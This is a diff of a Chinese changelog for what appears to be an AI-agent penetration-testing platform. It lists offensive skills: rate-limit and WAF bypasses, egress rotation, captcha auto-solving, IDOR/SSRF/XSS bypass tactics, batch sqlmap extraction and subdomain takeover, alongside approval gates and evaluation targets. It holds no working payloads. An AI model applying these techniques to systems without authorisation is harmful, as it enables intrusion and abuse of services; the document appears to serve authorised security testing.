-- 测试：引擎批次 C（build+vet+全量单测，新增 v46c 3 项）连续 3× 全绿；captcha-ocr 6/6、primitive-graph 3/3、心跳状态机 5/5 各连续 3×；文件层核查扩容至 48 项 3×；全面核查（四合一）3× 4/4；镜像重建部署核验 3× 12/12
+- 新增（验证队列引擎枚举）：预算预警自动枚举验证队列
+- 新增（L2 未用门）：收口比对已批准工单使用痕迹
+- 新增（通道心跳标准件）：空闲窗口周期性基线自检
+- 新增（验证码 OCR）：本地识别自动填入，失败回退人工
+- 新增（原语图）：按链模板输出建议，缺口自动入队
+- 新增（ROE Profile 引擎消费）：YAML 解析校验与运行时含义注入
+- 修复（解析缺陷）：节头游标与字模编码修正
 
 ## v4.6.0 · 2026-11-11
 
-- 新增（能力主版首批·A1 执行可靠性小项速清）：E5 教训消费时强制标记——上下文注入对无样本强度/单次实验教训自动追加「provisional：跨目标使用前须 ≥3 样本复验」（存量数据免迁移即生效）；V6 僵尸回填门——s7 收口门检测同义单元（归一化键相同）终态+needs_follow_up 并存，要求合并回填（覆盖键漂移僵尸形态）；R1 反思门 LLM 失败重试 ×3（2s 间隔），仍失败且确定性门通过者阶段标记 quality-pending、s8 收口门强制复核（终结「放行并留痕」无声放行）；B4 报告引用核验——s8 门对 report.md 引用的 evidence/ 路径逐个存在性校验（引用证据文件缺失形态）；K5-lite 空闲提醒——跨阶段空闲 >30min 注入「先做通道基线自检，不沿用上一阶段通道结论」；K2 行为类教训引擎注入——按黑板 behavior.<目标> 分型自动优先注入命中教训；V2-lite 预算预警消息升级「先消耗就绪资产再收口」
-- 新增（能力主版首批·A2 验证队列引擎化）：store 新增 vts bucket 与 VerificationTask 一等对象（title/ready_assets/start_conditions/cost_note/priority/status 五态）；新工具 record_vt/update_vt（closed-roe/deferred 强制理由，executed 附 result_ref）；s7 收口门新增 VT 清点——开放状态任务必须逐条三选一处置，禁止静默蒸发（审计实证：某限速案例 七条/某分型案例 五条「脚本就绪」验证线因预算收口全部蒸发）
-- 新增（能力主版首批·W2 情报工厂）：intel-factory 技能——JS 情报强制取件清单（主 bundle+全部 chunk/运行时配置文件必取/source map 还原）与四件套产出（端点表→authz-diff、密钥材料→crypto-offensive、业务状态机、内网拓扑）；tools-extra/subdomain-takeover.py——19 类 CNAME 悬挂指纹路由 + DoH 解析（沙箱 UDP 阻断兼容）+ --live 现场二次确认口径（审计确认全程漏做的 L0 合法项，指纹路由自测 7/7）
-- 新增（能力主版首批·W3 请求伪造）：crypto-offensive 技能——协议还原器标准步骤（oracle 产物+≥3 组单测向量；WASM 二进制当场落盘）与三通道投递器（直连/限速窗口/快照重放），每次投递强制请求/响应原文+HTTP 与 json_code 双状态码落盘并回填 claims（直击 历史实证「破解率 100% 投递率 0%」与无状态码不可判定）；authz-diff 技能 + tools-extra/authz-diff.py 差分矩阵执行器——阳性对照（已知 anon 端点）/阴性对照（乱码路径）/「500 未知异常=控制器可达」判据/HIT-DATA 判定/同族复查提示，selftest 起本地 canned 服务验证四类判读+UND 纯断言（连续 3× 4/4）
-- 新增（能力主版首批·T2 对抗 mock 靶标）：eval/mocks/adversarial_mock.py 双模式——限速模式（令牌桶→断连→锁定→锁定期探活延长锁定的 K4 语义可测化→静默恢复）；JS 挑战模式（202 挑战+会话发放→token 复现握手→批量导航静默降级空壳的瑞数语义简化复刻）；smoke_test.py 8 场景冒烟（连续 3× 8/8）——对抗类改动首次拥有可回归验收环境
-- 提示词：s1（W2 子域接管/情报工厂指针+行为类预判）、s3（四件套承接）、s4（Authz-Diff 标准动作+crypto-offensive）、s5（投递纪律双状态码回填）、skills/00-router.md +3 行（累计 99 个中文攻击剧本）；Dockerfile +2 行（authz-diff/subdomain-takeover 进镜像）
-- 测试：每批次按「连续 3 次无问题」标准执行——引擎 build+vet+全量单测 3×（新增 v46b 6 项：provisional 标记/行为类注入/空闲提醒/僵尸门/VT 全生命周期/quality-pending+报告引用门）；离线门夹具 3× 13/13；文件层核查扩容至 41 项 3×；对抗 mock 冒烟 3× 8/8；全面核查（四合一编排器）3× 4/4；镜像重建部署后核验 3× 9/9
+- 新增（执行可靠性速清）：教训标记、僵尸回填门、反思门重试、报告引用核验、空闲提醒、行为类教训注入
+- 新增（验证队列引擎化）：验证任务一等对象与登记/更新工具；收口清点门
+- 新增（情报工厂）：情报取件清单与子域接管工具
+- 新增（请求伪造）：协议还原器口径与差分矩阵执行器
+- 新增（对抗 mock 靶标）：限速与 JS 挑战双模式
+- 提示词与镜像配套接线
 
 ## v4.5.0 · 2026-11-11
 
-- 新增（执行可靠性增补层 W1·引擎级，依据 2026-11 全量任务审计 26 运行/17 委托任务/99 findings/11 例误判）：E1 结论-证据硬校验——record_finding 三件套（claims 判据串逐条 file+must_contain 核验/否定性断言（空 jar、未暴露、全部 000 等）无 claims 拒绝/「确证」与「待验证」同文拒绝），deterministicGate 收口层兜底（否定性断言与证据矛盾/零证据确证/确证与待验证矛盾三类形态入口拦截）；E2 后台任务终态标记——日志尾强制 [JT-JOB-END] state/exit + sidecar 终态回写，s7 门拦截无标记日志（部分扫描被洗白形态）；E3 负结果语义——update_coverage 强制 observed_result 枚举，undetermined_timeout/blocked 类不得支撑 ruled_out/no_issue_found，缺失自动降级 needs_follow_up（超时被误判未暴露形态）；E4 可利用性双维——exploitability 字段（verified/conditional/untested），高危+untested 自动降级中级（某网关案例 双轨定级口径固化）
-- 新增（W1 续）：B1 入口判重——AddFinding 归一化标题全等拒绝（归一化标题全等双记形态）；B5 结论回写——新工具 update_finding（severity/confidence/exploitability/detail_append，强制 reason，时间线留痕）（结论修正未回写权威库形态）；V3 收口强制清单——s4/s5 complete_stage 必须提交 ready_but_unexecuted 与 l2_approved_unused（空也要显式 []，时间线登记）（某限速目标 12 条就绪线蒸发形态）；V6 覆盖键归一化——UpsertCoverage 去 scheme/尾斜杠原地合并，展示保留首见原文（覆盖键漂移僵尸形态）；K7 命令空闲护栏——config command_idle_timeout_sec 默认 120s，活动看门狗终止进程组（长命令静默挂起形态）
-- 新增（W1 技能/提示词/治理层）：六技能入库——channel-snapshot（K1 通道资产固化标准动作：CDP getCookies→Netscape jar+meta、快照重放先于失效判定、UA 绑定纪律）/js-challenge-waf-playbook（K6 对策阶梯：快照复用→浏览器池→出口轮换→客户协同申请→ROE 允许的离线挑战；行为预算器；本地故障与目标行为分离归因）/rate-limit-playbook（有效 conn/s 核算/完全静默冷却/窗口化批量执行）/closed-site-playbook（403 白名单穷尽矩阵，承 某封闭站案例 30+ 变体打法）/gateway-filter-playbook（阳性对照差分法，承 某网关案例）/appliance-mgmt-playbook（WASM 协议还原/反脚本绕过，承 某设备案例）；browser-kit/channel-snapshot.py 标准件；loop-core 执行可靠性纪律七条 + s1/s4/s5/s7/s8 阶段头增补；ROE Profile 治理参数化模板 + roe_validate.py（YAML 子集解析+schema 校验+内置正反例自测）
-- 新增（W1 验收基建）：eval/gates 离线质量门四件（claim_evidence/async_marker/reconcile/coverage）+ run_all_gates.py 汇总器 + 12 夹具（11 例审计误判形态+1 例重复登记）+ clean 夹具——自测 12 误判全拦截+clean 零误伤（连续 3× 13/13），并在真实历史项目上验证拦截能力（jar 案/nuclei 0 字节/空证据文件全部命中）；eval/run_comprehensive.sh 全面核查编排器（引擎 build+vet+全量单测/离线门/文件层/ROE 四合一）
-- 修复（审计驱动）：writeJobSidecar 增加 finalizeJobSidecar 终态回写；getProjectID 类型开关补 VerificationTask（修复 VT 落库后 ListVTs 检索不到）；测试 TestDeterministicGateS8DuplicateRoot 更新为 B1 新语义（入口判重拒绝+24 字符前缀近似对仍由 s8 门拦截）
-- 测试：引擎 build+vet+全量单测（新增 v46_gate 9 项/v46_executor 2 项）连续 3× 全绿；部署核验（容器运行/端口/二进制标记/工具编入/挂载层/DB 持久化）连续 3× 7/7
+- 新增（结论-证据硬校验）：claims 判据串逐条核验与收口兜底
+- 新增（后台任务终态标记）：日志尾强制终态标记与收口拦截
+- 新增（负结果语义）：观测结果枚举强制，缺失自动降级
+- 新增（可利用性双维）：exploitability 字段与降级规则
+- 新增（可靠性五件）：入口判重、结论回写、V3 清单、覆盖键归一化、空闲护栏
+- 新增（六技能入库）：通道快照/JS 挑战/限速/封闭站/网关过滤/设备管理
+- 新增（验收基建）：离线质量门四件与全面核查编排器
+- 修复（sidecar 终态回写与 VT 检索）
 
 ## v4.4.2 · 2026-11-10
 
-- 新增（S4 多目标分段收口·批次6 收官）：确定性对账门——多目标项目 S4 收口时逐目标对账「已 update_coverage（Endpoint/Notes 归一化包含）或已列入待续清单/档案目标」；引擎观测到 ≥2 个目标已真实覆盖而仍有目标两处皆无时拦截收口（防"先到先得测完 2 个目标、其余目标静默丢失"），matched<2 不拦（整目标零覆盖由提示词纪律与轮次止损兜底，mock 演示不触发）；**分组产出约定 deliverables/s4-<目标或组名>.md**（s4 头新增 S4-9，S8 报告承接合并）；新增 splitProjectTargets/targetCoverageRecon 纯函数与 deliverablesText 语料读取（≤30 文件）、normCovText 归一化口径与 G2 对账同族；countProjectTargets 重构复用拆分函数
-- 测试：新增 4 个单测全过（目标拆分/对账纯函数含大小写归一化与待续清单归宿/门级集成双分支——拦截与待续清单放行）；Go 6 包全量回归；批次 1-5 核查器链式回归
+- 新增（多目标分段收口）：S4 收口逐目标对账门与分组产出约定
 
 ## v4.4.1 · 2026-11-10
 
-- 新增（评测高危隐藏项·批次5）：评测实例 4 个新隐藏面（暴露面/模板求值/上传落点/管理面越权 PII 各 1，mode=hidden weight=high，判分器新增匿名高危召回指标）——端点与埋点细节自 v4.7.1 起在外部评测扩展包维护，平台内不再留存；判分器新增「匿名高危召回」指标（weight=high 隐藏项命中率，无凭证高危能力度量）；README 评测段同步 18 类/三指标
-- 新增（一线 SRC 实战蒸馏·批次5）：67 篇一线挖洞实战文档提取 → 6 技能「实战补遗（v4.4 一线 SRC 实战实证）」——logic-sms-otp-matrix（回显编码形态扩展/短信限流绕过头族实测：号码部分 URL 编码+前后缀变体+网关截位/邮箱轰炸同构/受控验证合规口径）；api-idor（越权面六类清单/主体-资源标识替换复用法/撤回复用形态/越权+XSS 原语凑链）；logic-csrf-deser（支付包挑选三查/改单价/代金券拆分边界并发/异步通知面/注册覆盖链）；ssrf-deep（avatar 类第一排查位/# 注释出网确认/时长三分档实测基线 0.3s/1.1s/6s+）；xss-context（二阶跨页触发/action= 斜杠绕过/iframe data:base64 组合/审核链打点）；cors-redirect-hostheader（重定向三实现面/301-308 状态码族/跳转后 OAuth 利用链）；全部内容去目标标识（grep 复核 0 命中，仅收判据与 payload 形态）
-- 测试：4 个新面逐一实测可用 + 旧面回归（实测记录在外部评测包留存）；批次 5 核查器 25 项×3 轮全过；Go 6 包全量回归；批次 1-4 核查器链式回归全过
+- 新增（评测高危隐藏项）：隐藏面与匿名高危召回指标
+- 新增（实战蒸馏）：六技能实战补遗
 
 ## v4.4.0 · 2026-11-10
 
-- 新增（黑盒无凭证高危挖掘·批次1）：4 个攻击技能入库——identity-bootstrapping（无凭证身份获取 L1 注册→L2 泄露→L3 默认口令→L4 验证码逻辑→L5 令牌伪造→L6 会话构造决策树）/ anon-attack-surface（匿名高危暴露面四族总表：Java 生态/DevOps 数据层/信息泄露/边缘 OA，多目标批量形态）/ payload-mutation-algebra（过滤器指纹 12 探针→编码阶梯→语法等价→解析器差分→上下文逃逸→Fallback 七步链→403/401 专项→喷射纪律）/ evidence-standard（12 类 per-class 确证判据+误报反例清单+内网/云/AD/APP/AI 分节+通用四问）；技能路由 +6 行；loop-core 深度纪律 11（高危候选变异配额：≥5 种独立绕过+七步链用尽才许排除）/ 12（无凭证项目身份获取优先+确证前必查判据表）；速度纪律 7（多目标同构动作 -l 批量单轮，轮次 O(N)→O(1)）；s4 待利用队列 access/impact-rank 标注+无凭证收口三行报告；s2 暴露面普查路由与档案目标降级；s5 队列按 rank 升序消费
-- 新增（多目标轮次自适应·批次3）：S2/S4/S5 阶段轮次按目标数线性放大（base+(N-1)×per_target_rounds，封顶 3×base；config 新增 per_target_rounds 默认 10）；上下文包注入「🎯 多目标推进纪律」（目标级轮转先于类级轮转/单目标 2× 基线零确证止损让渡/不可达目标降级档案目标）；spawn_subagent 轮次硬上限 20→30 且工具描述随配置动态化；收口预警目标感知版（先补未覆盖目标最小覆盖再收口，未完成项列待续清单）；Mock E2E 实证：5 目标项目 s2/s4/s5 预算各 100 轮（基础 60 + 每目标 +10）、s8 不误标
-- 新增（payload 语料资产·批次2）：PayloadsAllTheThings 本地语料层固化进镜像 /opt/tools/PayloadsAllTheThings（3 次重试 fail-hard，实测基线门 142md/66 类目）；curated 字典三件进 /opt/tools/wordlists（403 绕过路径族 31 变体/头族 14 条/SSTI 五引擎判定矩阵）；镜像终检新增语料项；project-warmup 新增语料预检（PAT_OK/DICTS_OK）与缺料后台补装路径
-- 新增（队列与判据门·批次4）：finding 模型新增 access（anonymous/pre-auth/post-auth）与 impact_rank（1-6）字段；record_finding 工具新增两参数（无凭证项目必标 access）；S5 上下文包待利用队列按 rank 升序→置信度→严重度排序展示；漏洞页标题行队列徽章（rank · access）；反思门判据抽查（引擎级确定性规则）：高危确证 detail 未引用 evidence-standard 判据标记（判据/对照实验/孪生/双主体/三重/重放/回连命中等 13 标记）→ 自动降级疑似并注明补证路径，幂等防重复拦截
-- 测试：新增 7 个单测全过（目标计数边界/预算矩阵/子代理轮次钳制/上下文包注入/队列排序/判据判式/判据降级引擎级含幂等）；Go 6 包全量回归；docker 镜像重建 fail-hard 终检通过（nuclei 模板 14236 + PAT 语料 142 篇 + 三字典）；生产实例重建部署冒烟通过
+- 新增（无凭证高危挖掘）：身份获取/匿名暴露面/载荷变异/证据标准四技能
+- 新增（多目标轮次自适应）：轮次线性放大与推进纪律
+- 新增（payload 语料固化）：语料与字典进镜像
+- 新增（队列与判据门）：access/impact_rank 字段与判据抽查降级
 
 ## v4.3.1 · 2026-11-09
 
-- 改进（用户定向）：漏洞页「等级 × 置信度矩阵」由气泡图改为堆叠柱状图——x=等级（高/中/低/信息），柱内按置信度堆叠（确证红/疑似金/待查蓝），聚焦各等级中「确证」份量；tooltip 轴触发含总数与分层明细、minInterval=1 整数刻度、柱顶圆角、图例底部；卡片图标同步 BarChart3，aria-label 更新
-- 测试：vite 构建通过、体积预算达标；真实 Chromium 渲染确认（高 12 全红确证柱与表数据一致）；交互 E2E 7/7；Go 后端 6 包全量回归
+- 改进（漏洞页图表）：等级×置信度矩阵改堆叠柱状图
 
 ## v4.3.0 · 2026-11-09
 
-- 新增（企业级 UI 改造 P3 工程化·四阶段收官）：i18n 脚手架——vue-i18n 11 装配（zh 基准词表 + en 预留 + jt_locale 持久化切换），NavRail 十二项导航词表化；无障碍——nav/main landmark、图标 aria-hidden、focus-visible 焦点环全量、交互组件键盘可达；体积预算守卫 scripts/check-bundle.mjs（主包 gzip 75K/单分包 200K，超限 exit 1，接 Makefile ui-check）——当前实测主包 65.7K/AppChart 分包 181K 全部达标
-- 新增：真实浏览器 E2E 套件固化进仓库 scripts/ui-e2e/（run.mjs 全页双主题截图+错误收集 / interact.mjs 交互断言 7 项 / canvascheck.mjs 图表实例化计数 + README 口径说明）+ Makefile ui-e2e/ui-check 目标——UI 改动交付前必过（v3.7.3 白屏教训：构建绿灯可能是假阴性，真实浏览器是唯一拦截手段）
-- 测试：vite 构建通过；双主题 24 截图 0 错误；交互 E2E 7/7；体积预算全项 ok；Go 后端 6 包全量回归；Web UI 特定场景字眼零字面维持
+- 新增（i18n 脚手架与无障碍）：多语言装配、landmark、焦点环
+- 新增（体积预算守卫与浏览器 E2E 套件固化）
 
 ## v4.2.0 · 2026-11-09
 
-- 新增（企业级 UI 改造 P2 表格与工作台·四阶段第 3 阶段）：漏洞页交互三件套——排序（等级/置信度/标题/阶段，表头点击升降序+键盘可达）、多维筛选（等级/置信度下拉+关键字搜索防抖匹配标题与详情）、实时计数徽章（N/M 条，筛选无匹配显式空态）；全局键盘快捷键 g 前缀两段式（g d 仪表盘/g w 工作台/g f 漏洞/g a 资产/g t 时间线/g r 报告/g s 设置，输入框聚焦自动豁免）
-- 新增：执行流工具卡语义左边条（record_finding 红/record_loot 与 upsert_fact 绿/request_approval 紫/complete_stage 蓝/命令类默认）——高危动作一眼可辨，纯前端映射零数据变更；仪表盘与漏洞页详情加载中骨架屏（shimmer 占位替代误读空态）
-- 修复（交互 E2E 抓出）：FindingsPage 使用 ref 未导入致整页白屏（ReferenceError）——vue 导入行补齐
-- 测试：vite 构建通过；交互 E2E 7/7（计数徽章/等级筛选/动态期望搜索/排序首行/两段式快捷键/语义边条 computed 样式）console 错误 0；双主题 24 截图 0 错误；Go 后端 6 包全量回归
+- 新增（漏洞页交互三件套）：排序、多维筛选、实时计数徽章；全局两段式快捷键
+- 新增（工具卡语义边条与骨架屏）
+- 修复（发现页白屏）：vue 导入补齐
 
 ## v4.1.0 · 2026-11-09
 
-- 新增（企业级 UI 改造 P1 数据可视化·四阶段第 2 阶段）：AppChart 组件——ECharts 6 按需引入（Pie/Bar/Scatter+Tooltip/Legend/Grid，独立懒加载分包 544K/gzip 185K 主包零增重）、双主题自适应（CSS 令牌→canvas 色板注入+主题切换重绘）、ResizeObserver 自缩放、卸载回收、aria-label
-- 新增：仪表盘三图——漏洞等级分布环形图/命令风险分布环形图（含图例与占比 tooltip）/阶段耗时横向条形图（运行中阶段实时增长金色高亮）；发现页新增「等级×置信度矩阵」气泡图（气泡=条数，聚焦高危且确证）；既有 CSS 横条保留为空态降级
-- 修复（E2E 真实浏览器实测抓出）：①CSS 变量在 canvas 无效致漏洞环渲染黑色——改 hex 色板映射；②气泡 symbolSize 三维 encode 不存在致 NaN 不可见——改 params.data.count 取值
-- 整改：更新记录引用特定场景字眼处改写（Web UI 源码字面零命中维持）
-- 测试：vite 构建通过；真实 Chromium E2E 双主题 24 截图 console/page 错误 0；canvas 实例化计数（仪表盘 3/发现页 1）；Go 后端 6 包全量回归通过
+- 新增（AppChart 组件）：ECharts 按需引入与双主题自适应
+- 新增（仪表盘三图与矩阵气泡图）
+- 修复（canvas 主题色与气泡取值）
 
 ## v4.0.0 · 2026-11-09
 
-- 新增（企业级 UI 改造 P0 视觉底座·四阶段第 1 阶段）：全局设计令牌体系——间距 8 档/圆角三档/字号五级/阴影三档/状态语义色层（state-run/ok/danger/info/block，组件一律消费语义名）+ 全部既有变量与类名向后兼容（.card/.badge/.chip/.msg/.toolcard 等 25 处原样保留）；统计卡等宽数字 tabular-nums + 渐变卡；全局 button/input 焦点环与 hover 过渡、骨架屏 shimmer、Toast 入场动画、模态阴影
-- 新增：基础组件库 src/components/ui/ 五件——AppCard（标题+图标+动作插槽）/AppStat（语义色调统计卡）/AppBadge（状态徽章+呼吸圆点）/AppEmpty（图标空态）/AppSkeleton（加载骨架）
-- 改造：NavRail 文本符号图标 → lucide-vue-next 真 SVG 图标（tree-shakable，12 项语义对齐 + active 渐变辉光 + 键盘可达）；TopBar 主题切换/用户/退出按钮图标化；仪表盘重构——11 张统计卡全部语义色调+图标（漏洞=高危红/达标绿、待审批=超时警示…）、四区块 AppCard 化、阶段徽章呼吸点、表格数字对齐
-- 整改（用户绝对口径）：Web UI 全源码特定场景字眼清零（12 处更新记录历史措辞→评测站/目标主机）——grep 复核 0 命中
-- 测试：vite 构建通过（主包 125K）；真实 Chromium E2E 双主题 24 截图 console/page 错误 0（仪表盘/工作台数据态实证）；浅色主题令牌全量生效；Go 后端零触碰回归通过
+- 新增（设计令牌体系）：间距/圆角/字号/阴影/语义色层
+- 新增（基础组件库五件）
+- 改造（图标与仪表盘重构）
+- 整改（UI 字眼清零）
 
 ## v3.9.6 · 2026-11-09
 
-- 修复（核查阶段二轮修复项）：①G3 处置留痕匹配增强——待续条目末段路径剥常见 Web 扩展名（.php/.jsp/.asp/.aspx/.html/.htm/.do/.action）补一路归账候选，处置文本写「dirlist 已补测」等无扩展名形态也能归账（TestFollowUpDispositionGate 补回归）；②README 版本行/技能数与版本常量对齐（86 个中文攻击剧本）；③本地 web/ 目录同步构建产物（本地非 Docker 运行路径的更新记录与版本号一致）；④评测目标 docstring 编号对齐；⑤镜像重建部署（容器版本常量与 API 同源一致）
-- 测试：verify_release 发版核查在 v3.9.6 上执行，连续核查见更新记录口径
+- 修复（待续条目归账增强）：无扩展名路径补归账候选
 
 ## v3.9.5 · 2026-11-09
 
-- 新增（E2 对账视图·指挥室可见性）：工作台「覆盖度」页签新增「自述面对账」区块——后端新增 GET /api/projects/{id}/reconciliation（引擎 ReconciliationPublic：checklist.json 条目归宿明细 covered/deferred/excluded/uncovered + 归一化匹配复用 G2 门同一套 helper，checklist 不存在时 enabled=false 零打扰）+ 前端渲染状态计数（已覆盖/延期排除/未归宿/清单外发现/发现总数）与逐条状态表；「清单外发现 N」=含【清单外】标注的发现数（潜在 0day 面的实时可见度量）；对账数据挂进覆盖度既有刷新链路（update_coverage 事件定向刷新 + 15s 兜底轮询自动带出）
-- 重构：checklistItemCovered/buildCovNorms 抽为引擎级共用 helper（收口门与对账视图同一套匹配口径，避免双处实现漂移）
-- 测试：TestReconciliationPublic 回归（无清单 enabled=false/归宿三态计数/清单外与发现总数计数）；vite 构建通过；Go 全量回归通过
+- 新增（自述面对账视图）：对账接口与覆盖度页签渲染
+- 重构（归一化匹配抽共用 helper）
 
 ## v3.9.4 · 2026-11-09
 
-- 新增（E1 评测环双模式扩容·8→14 类）：评测目标新增 3 类绕过型漏洞（编码注入：解码后拼 SQL/空格过滤绕过：注释片段替代/会话前置注入）与 3 类隐藏无标注漏洞（隐藏注入端点无页面链接仅环境配置残留线索/上下文逃逸 XSS：输出在 JS 字符串内/隐藏 SSRF：会话前置仅内部注释提及，限回环地址）——隐藏项专测「清单外盲挖/0day 能力」：目标不告诉你有什么，靠泄露情报承接/目录枚举/参数 fuzz 自主发现
-- 新增（判分器双指标）：eval_run.py score 拆分 mode=declared/mode=hidden——报告新增「自述面召回（覆盖下限）」与「清单外盲挖（隐藏项命中=0day 能力度量）」两行；expected.json 新增 6 条目含 mode 标记；README 评测环描述同步 14 类与双指标口径
-- 测试：评测目标 6 个新端点逐一实测可用（布尔差分/上下文注入/会话门控 302/回环 SSRF）；判分器冒烟（declared 3/11、hidden 2/3、extras 正确分离）；Go 全量回归通过
+- 新增（评测环扩容 8→14 类）：绕过型与隐藏无标注漏洞
+- 新增（判分器双指标）：自述面召回与清单外盲挖
 
 ## v3.9.3 · 2026-11-09
 
-- 整改（方法论目标类型无关·用户原则固化）：智能体运行时内容全面中性化——「特定场景」概念从 heads/prompts/skills/引擎文案零化（grep 全量核查 0 命中）；loop-core 深度测试纪律新增「目标类型无关（方法论第一性）」条：不预设目标为任何特定环境、不依赖外部标签/菜单命名/提示注释，一切结论只从目标实测行为推导，自述面清单/robots/注释仅是情报输入、存在与否不改变测试深度；实测任务表述统一为「实战授权测试任务」；存量「目标目标主机」措辞全部改「目标主机」（含注入智能体上下文的运行环境声明、代理策略文案、引擎注释共 9 处）；oob-interactsh「内网隔离评测站」→「内网隔离环境」；S2-9 明确自述面清单只是覆盖下限、任何"自己列出功能清单"的目标都适用、无自述面时五轨深挖照常——换任何目标环境能力口径不变
-- 测试：Go 全量回归通过；中性化 grep 复核（运行时内容 0 命中，评测装置文档按「评测站只是测试装置」定位保留）
+- 整改（方法论目标无关化）：运行时内容全面中性化；新增目标类型无关纪律条
 
 ## v3.9.2 · 2026-11-09
 
-- 新增（T4 sqlmap 自动化批量扩展）：实测某任务手工探针确证 6 个注入端点但 sqlmap 只深验 2 个（宽字节/base64 等绕过端点停留在手工延时层面无结构化提取）——技能 sqli-deep 第二节新增「自动化批量扩展」：手工确证/疑似 ≥2 端点必须批量过 sqlmap（-m URL 列表 / -r 逐个，统一提取四件套 banner/current-user/current-db/is-dba，命中库表加 --tables --count 存在性证明口径）；绕过型端点用 --prefix/--suffix 或 tamper 显式表达绕过形态；限速与 update_coverage 归账纪律不变
-- 改进：s5 头 S5-2 补批量扩展强制线（确证/疑似 ≥2 端点禁止单点深验）
-- 测试：Go 引擎回归通过
+- 新增（SQLi 自动化批量扩展）：批量验证纪律节
+- 改进（s5 批量强制线）
 
 ## v3.9.1 · 2026-11-09
 
-- 新增（T3 XSS 渲染级验证·确证标准）：实测某实战授权测试任务 XSS×7 全组零触达且无渲染级确证手段——技能 xss-context 新增「确证标准：渲染级验证」节：响应包含 payload ≠ XSS 确证，反射/DOM 型必过真实浏览器渲染确认（headless chromium --virtual-time-budget 或 browser-kit dialog 捕获+截图留证，alert(7*7) 算术值防误报）；上下文定位先行（先判输出上下文再选 payload，禁盲发列表）；DOM sink 动态确认（hash/name 承载输入 curl 永远测不出必须渲染）；留证与降级口径（无头不可用时静态上下文核对并注明）
-- 测试：Go 引擎回归通过；技能文件完整性核查（heredoc 误写 shell 包装行已清除）
+- 新增（XSS 渲染级验证标准）：确证标准节
 
 ## v3.9.0 · 2026-11-09
 
-- 新增（T2 会话态测试链·技能 85→86）：实测某任务 login-gated 注入测试项万能密码失败后直接放弃（缺标准路径：未走注册→登录→带态测试）；新增技能 session-state-chain——决策树（测试账号/注册开放/注册关闭/browser-auth 四路）、A 注册链（唯一标记账号+record_loot 掩码登记+注册响应逐字段核对）、B 登录与会话保持（cookie jar 落盘复用/多账号 jarA·jarB/CSRF token 两步封装/登录后带态端点清单=盲挖主战场）、C 带态测试（登录后注入/水平垂直越权/存储型/逻辑滥用五类要点表）、D 清理（清理铁律+注销会话+jar 文件收口处置）、判据与留痕纪律
-- 改进：00-router 新增「测试项需要登录态」路由行；s5 头 S5-2 补前置依赖登录态时先走 session-state-chain 标准链（登录面打不动才降级 premise_failed）；s4 头 S4-3 补认证前置类测试项 S4 即建会话先行验证
-- 测试：Go 引擎回归通过
+- 新增（会话态测试链技能）：决策树与注册/登录/带态/清理全链
+- 改进（登录态路由接线）
 
 ## v3.8.9 · 2026-11-09
 
-- 新增（T1 噪声感知探测协议·判定质量基线）：实测某任务时延判定被目标间歇空响应/动态丢包污染——space.php 两种绕过被噪声判负、time2.php 一次 4.3s 但 sleep(5) 对照 0.2s 未复测收敛；技能 scan-tiering 新增第六节五条协议：①空响应（CODE=000/空 body）=不可判定，退避重试 ≥2 次仍失败标 inconclusive，禁止单次空响应下「不存在」结论；②时延类判定三重测（载荷 3 次+对照 2 次+阈值标定取中位数，差值 ≥2s 才算命中）；③对照先行（目标天然慢时用差值判据并记录两组数值）；④命中信号立即归档（引擎 G1 门按 evidence 文件名归账）；⑤批量探测限速（防目标动态丢弃）
-- 改进：loop-core 深度测试纪律④「差异测试通用化」补判定前必过噪声协议指针（load_skill scan-tiering 第六节）
-- 测试：Go 引擎回归通过
+- 新增（噪声感知探测协议）：空响应/时延/对照/归档/限速五条协议
+- 改进（loop-core 噪声协议指针）
 
 ## v3.8.8 · 2026-11-09
 
-- 新增（陌生环境深挖协议·0day 能力核心）：真实目标不会把漏洞写在菜单里（无自述面是常态）——loop-core 深度测试纪律新增三条：⑦广度优先轮转（首轮每漏洞类最小探针封顶 3-5 轮、全类有结论才深化、单类深化超阶段预算 25% 需说明理由——治实测「已知主线深化挤占未触达类」）；⑧深化限额（同一发现深化 ≤3 轮自动转 needs_follow_up，预算让位）；⑨陌生环境五轨深挖（隐藏参数 arjun/响应差异 fuzz/JS 与文档泄露承接/二阶存储路径/逻辑滥用），无自述面目标强制执行缺轨说明——自述面清单只做覆盖下限，**清单外发现才是核心产出**
-- 新增（清单外发现/潜在 0day 面标注）：record_finding 对自述面与已知 CVE 映射之外的发现标注【清单外】；s4 交付物新增《清单外发现统计》；s8 报告新增「清单外发现与盲区」章节（单列统计+逐条深挖复盘+deferred/needs_follow_up 盲区清单）——0day 能力从此有可度量口径
-- 新增（审批预请求）：s3 头新增 S3-7——计划中识别的 L2 级动作（利用/写操作/横向/OOB 注册/隧道握手）在本阶段立即发起审批工单不等 S5（治实测审批与预算竞态致 T-08 类项流产）；s3 头新增 S3-8——测试计划必须含「陌生环境五轨深挖」排期与清单外发现判分口径
-- 测试：Go 全量通过（提示词层变更经引擎加载路径回归）
+- 新增（陌生环境深挖协议）：广度优先轮转、深化限额、五轨深挖
+- 新增（清单外发现标注与报告盲区章）
+- 新增（审批预请求）：S3 阶段预发起 L2 工单
 
 ## v3.8.7 · 2026-11-09
 
-- 新增（G3 待续清单回灌门·引擎硬门）：实测某任务 needs_follow_up 待续清单在 s4→s5→s6→s7 原样传递四个阶段无人执行（ssrf2-10/members 认证组/越权遍历下载组零回填）；现 s7 收口时确定性硬校验（零 LLM 成本）：收集全项目覆盖矩阵 status=needs_follow_up 条目，要求 s7 交付物或报告文本逐项引用端点关键词留痕处置（端点匹配宽容三路：完整归一化端点/末段路径/参数名≥4字符任一命中即归账），零引用条目拦截收口；处置三态=已补测（update_coverage 更新）/范围外（附理由）/移交复测建议
-- 改进：s7 头新增 S7-4《待续清单处置》必做步骤与交付物；complete_stage 无条件硬校验范围扩展至 s7
-- 测试：TestFollowUpDispositionGate 回归（无待续不生效/两条零处置全拦/末段路径与参数名双路留痕放行）；Go 全量通过
+- 新增（待续清单回灌门）：s7 收口确定性硬校验
+- 改进（s7 处置交付物步骤）
 
 ## v3.8.6 · 2026-11-09
 
